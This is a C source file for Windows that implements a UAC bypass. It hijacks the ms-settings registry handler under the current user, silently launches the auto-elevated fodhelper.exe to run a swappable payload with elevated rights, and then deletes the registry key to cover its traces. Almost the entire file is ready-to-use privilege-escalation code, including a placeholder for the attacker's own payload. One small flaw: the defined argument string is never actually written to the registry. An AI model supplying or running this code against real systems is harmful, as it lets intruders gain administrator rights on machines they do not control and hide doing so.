#include <windows.h>
#include <stdio.h>
#include <shlobj.h>

int main(void) {
    HKEY hKey;
    const wchar_t* regPath = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";

    // Create hijack key
    if (RegCreateKeyExW(HKEY_CURRENT_USER, regPath, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        // <<< CHANGE THESE TO YOUR DESIRED ELEVATED PAYLOAD >>>
        const wchar_t* payload = L"C:\\Windows\\System32\\cmd.exe";
        const wchar_t* args   = L"/k whoami && echo SUCCESS - Silent elevation achieved && pause";

        RegSetValueExW(hKey, L"", 0, REG_SZ, (const BYTE*)payload, (DWORD)((wcslen(payload)+1)*sizeof(wchar_t)));
        RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (const BYTE*)L"", 0);

        RegCloseKey(hKey);

        // Trigger via trusted auto-elevated binary (fodhelper still has some success on 25H2)
        // Optional: add high priority thread + sleep to win races
        SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

        ShellExecuteW(NULL, L"open", L"C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, SW_HIDE);

        printf("[+] Registry hijack triggered. Waiting for elevation...\n");
        Sleep(2500);  // Give time for process to start and load payload

        // Optional cleanup for stealth
        RegDeleteKeyW(HKEY_CURRENT_USER, regPath);
        printf("[+] Cleanup completed.\n");
    } else {
        printf("[-] Failed to set registry key.\n");
    }

    return 0;
}
